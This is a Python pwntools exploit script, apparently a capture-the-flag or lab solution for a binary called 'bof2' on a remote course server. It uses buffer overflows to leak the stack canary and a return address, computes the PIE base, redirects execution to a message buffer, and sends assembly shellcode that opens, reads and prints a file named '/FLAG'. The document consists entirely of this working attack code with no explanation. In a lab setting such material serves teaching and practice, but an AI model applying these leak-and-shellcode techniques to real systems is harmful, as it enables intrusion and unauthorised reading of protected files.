#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os   = 'linux'

REMOTE = ('up.zoolab.org', 12343)
elf = ELF('./bof2')  # 

msg_canary = elf.symbols['msg']
print(f"[+] msg virtual canary  = {hex(msg_canary)}")


#r = process('./bof2')
r = remote(*REMOTE)
#==================================buf1==============================
r.recvuntil(b"name? ")
r.send(b"A" * (48+48+40)+b"W")  #sendline end with \n 

welcome = r.recvuntil(b"\nWhat's the room number?")

raw = welcome.split(b"Welcome, ")[1]  
lines = raw.split(b"W")
payload_line = lines[0]              # AAAAAAA
leak_line = lines[1]                 # canary 

canary = leak_line[:7]            
canary = u64(canary.ljust(8, b"\x00"))
canary*=256 #append 0x00

print(f"[DEBUG] wel = {welcome!r}")
print(f"[DEBUG] raw = {raw!r}")
print(f"[DEBUG] lines = {lines!r}")
print(f"[DEBUG] payl = {leak_line!r}")
log.success(f"canary  = {hex(canary)}") ##check



#==========================================buf2==========================================
r.sendline(b"A" * (48+55))  #sendline end with \n 
room = r.recvuntil(b"customer's name? ")
print(f"[DEBUG] room = {room!r}")

lines = room.split(b"\n")
print(f"[DEBUG] lines = {lines!r}") 


payload_line = lines[0]              # AAAAAAA
leak_line = lines[1]                 # return address bytes 

saved_rip = leak_line[:6]            # 6 bytes 
addr = u64(saved_rip.ljust(8, b"\x00"))
pie = addr - 0x9cbc
log.success(f"leak  = {hex(addr)}")
log.success(f"PIE   = {hex(pie)}")
#pause()

#=================================buf3=======================================
msg_rt = pie + 0xef220
log.success(f"msg@  = {hex(msg_rt)}")
payload = b"A" *40
payload += p64(canary)   
payload += b"A" *8
payload += p64(msg_rt)

r.sendline(payload)


r.recvuntil(b"Leave your message: ")

shellcode = asm("""
    xor rax, rax
    mov rbx, 0x47414c462f      
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    mov rax, 2                
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 100
    xor rax, rax              
    syscall

    mov rdi, 1
    mov rax, 1                
    syscall

    mov rax, 60
    xor rdi, rdi
    syscall
""")

r.send(shellcode)

#  flag
r.interactive()
